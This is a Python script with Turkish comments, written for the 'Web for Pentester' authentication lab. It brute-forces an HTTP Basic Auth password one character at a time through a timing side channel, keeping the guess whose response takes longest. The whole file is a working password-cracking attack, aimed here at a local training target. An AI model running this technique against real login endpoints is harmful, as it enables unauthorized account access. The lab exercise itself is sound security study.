import requests
from requests.auth import HTTPBasicAuth
import time

#bu kod web for pentester authentication example2 icin yazılmıştır

site = "http://192.168.1.39/authentication/example2/"
kullancı = "hacker"

şifre = "qwertyuopasdfghjklizxcvbnmöç1234567890" #deneyecegimiz şifreler

sözlük = {}
sayılar = []
bulunan = ""
en_uzun_zaman = [0.0] # süreleri karşılaştırma yapacagımız liste

def gelen_giden_zamanı_bul(tahmin): #şifreyi giricez tahmin yazan yere

    auth = HTTPBasicAuth(kullancı,tahmin)
    
    süre = requests.get(site,auth=auth).elapsed.total_seconds() # kullanıcı adını ve şifreyi gönderiyoruz  
    # gönderdiğimiz değerler ne kadar sürede bize geri döndü
    
    sözlük[süre] = tahmin # sonradan bu değerler ile daha iyi etkileşim kurabilmek icin sözlüğe alıyorum
    
    print(f"{tahmin} : {süre}") # şifre : şifrenin gidiş geliş süresi olarak yazdırıyorum
    
    if float(süre) > float(en_uzun_zaman[0]): #eğer süre listedeki elemandan büyükse 
        en_uzun_zaman.clear() #listeyi komple siliyoruz
        en_uzun_zaman.append(float(süre)) #listeye süre'yi ekliyoruz

index = 0
while True:
    index += 1
    for q in range(len(şifre)):
        gelen_giden_zamanı_bul(f"{bulunan}{şifre[q]}") #bulunan adlı değişken ilk indexde boş olacak ardından o anki indexdeki bulunan şifreyi
        #bulunan adlı değişkene ekliycez
        
        if q == len(şifre)-1: #şifredeki bütün değerler teker teker denendiyse
            
            zaman = en_uzun_zaman[0] # en büyük zamanı alıyoruz
            b = str(sözlük[zaman]) #sözlük[zaman] diyerek sözlüğün zaman değeri sayesinde şifrenin değerine ulaşıyorum 
            bulunan += b[-1] #bulunan şifrenin son değerini bulunan adlı değişkene atıyorum
            
            print("*********")
            print("bulunanlar :")
            print(sözlük[zaman])
            print("***********")
            print("şifrenin gitme gelme zamanı :")
            print(en_uzun_zaman[0])
            print("***********")
            en_uzun_zaman = [0.0] #yukarıda karşılaştırma yapılırken bir karışıklık çıkmaması acısından yeniden listeyi eski halıne getiriyorum
    if index == 15: # bu uzunluk değiştirilebilir şifre uzunlugunun 15 oldugunu varsayarak yazdım
        break
